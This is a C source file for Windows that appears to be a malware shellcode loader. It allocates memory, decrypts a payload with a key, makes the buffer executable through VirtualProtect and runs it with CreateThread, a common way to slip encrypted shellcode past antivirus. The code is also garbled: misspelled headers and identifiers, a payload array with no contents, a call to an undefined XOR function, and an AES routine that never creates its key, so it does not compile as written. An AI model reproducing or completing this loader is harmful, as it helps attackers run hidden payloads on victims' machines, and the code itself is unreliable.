#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.ht>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTENT)){
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
        return -1;
    }
    if (!CryptDecrypt(hKey, (HCRYPTHAHS) NULL, 0, 0, payload, &payload_len)){
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int main(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    unsigned char paylod[] = 
    unsigned int payload_len = sizeof(payload);
    char key[] = "mysecretkeee";

    //allocate a buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    //decrypt (DeXOR) the payload
    XOR((char *) payload, payload_len, key, sizeof(key));

    //copy payload to allocated buffer
    RtMoveMemory(exec_mem, payload, payload_len);

    //make the buffer executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    //launch payload
    if ( rv != 0 ) {
        th = CreateThread(0, 0, (LPRTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
